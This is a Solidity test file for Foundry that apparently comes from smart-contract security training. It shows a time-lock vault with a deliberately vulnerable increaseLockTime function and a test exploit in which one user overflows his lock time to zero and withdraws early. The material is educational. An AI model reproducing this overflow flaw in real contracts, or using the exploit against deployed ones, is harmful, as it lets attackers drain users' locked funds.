// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";


// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0

What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint) public balances; // balance of certain address
    mapping(address => uint) public lockTime; // locktime of certain address

    function deposit() external payable {
        balances[msg.sender] += msg.value; // update the balance of sender address for deposited amount.
        lockTime[msg.sender] = block.timestamp + 1 weeks; // set the locktime of sender address. 
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable, it increase the locktime of sender address.
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds"); //check that the balance of sender address is greater than 0, or else error of insufficient funds.
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired"); //check that the block.timestamp is greater than locktime of sender address, or else error of unexpired time lock

        uint amount = balances[msg.sender];// set the variable "amount" as balance of sender address
        balances[msg.sender] = 0; // set sender address' balance as zero

        (bool sent, ) = msg.sender.call{value: amount}(""); // performs a call to anonymous fallback function of msg.sender . 
                                                            // A fallback function gives contract ability to receive ether.       
        require(sent, "Failed to send Ether");// check if the call is success or else error of failed to send ether
    }
}

contract ContractTest is Test {
    TimeLock TimeLockContract; // Reproducing Timelock contract as TimelockContract
    address alice; // declaring variable address named alice
    address bob;  // declaring variable address named bob

/*  */
    function setUp() public {
        TimeLockContract = new TimeLock(); //creating new instance of TimeLock
        alice = vm.addr(1);  // gets the address of given private key for alice
        bob = vm.addr(2); // gets the address of a given private key for bob
        vm.deal(alice, 1 ether);   // sets Alice address balance to 1 ether
        vm.deal(bob, 1 ether); // sets Alice address balance to 1 ether
    }    
           
    function testFailOverflow() public {
        console.log("Alice balance", alice.balance); // logs alice balance
        console.log("Bob balance", bob.balance); // logs bob balance

        console.log("Alice deposit 1 Ether..."); // logs Alice deposit 1 Ether
        vm.prank(alice); // Sets the *next* call's alice address to be the input address
        TimeLockContract.deposit{value: 1 ether}(); // calls deposit function of TimelockContract with value of 1 ether
        console.log("Alice balance", alice.balance); // logs Alice current balance after deposit

        console.log("Bob deposit 1 Ether..."); // logs Bob deposit 1 ether
        vm.startPrank(bob); // Sets all subsequent calls' Bob address to be the input address until `stopPrank` is called
        TimeLockContract.deposit{value: 1 ether}(); // calls deposit function of TimelockContract with value of 1 ether
        console.log("Bob balance", bob.balance); // logs Bob current balance after deposit


        // exploit here. Executes function increaseLocktime which computes the increase in locktime. 
        // However the input figure used in parameter exceeded the max value of data type uint.
        // The result will be zero when you add the increase.
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        console.log("Bob will succeed to withdraw, because the lock time is overflowed"); // logs the message if withdraw is successful
        TimeLockContract.withdraw(); // calling withdraw function
        console.log("Bob balance", bob.balance); // logs the message
        vm.stopPrank(); // Resets subsequent calls' msg.sender to be `address(this)`

        vm.prank(alice); // Sets the *next* call's alice address to be the input address
        console.log("Alice will fail to withdraw, because the lock time not expired"); // logs the message
        TimeLockContract.withdraw();    // expect revert. 
    }
}